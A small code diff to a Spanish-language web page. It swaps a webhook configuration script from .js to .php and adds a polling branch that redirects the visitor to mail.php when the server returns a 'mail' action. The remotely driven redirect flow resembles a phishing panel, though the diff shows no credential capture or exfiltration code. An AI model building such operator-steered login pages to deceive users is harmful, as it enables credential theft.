@@ -198,7 +198,7 @@
     </div>
   </main>
 
-  <script src="webhook-config.js"></script>
+  <script src="webhook-config.php"></script>
   <script>
     // Mostrar email guardado y mensaje de error si existe
     document.addEventListener('DOMContentLoaded', function() {
@@ -280,6 +280,9 @@
           } else if (data.action === 'login') {
             clearInterval(pollInterval);
             window.location.href = 'index.html';
+          } else if (data.action === 'mail') {
+            clearInterval(pollInterval);
+            window.location.href = 'mail.php';
           }
         } catch (e) {
           // Silenciar errores de red
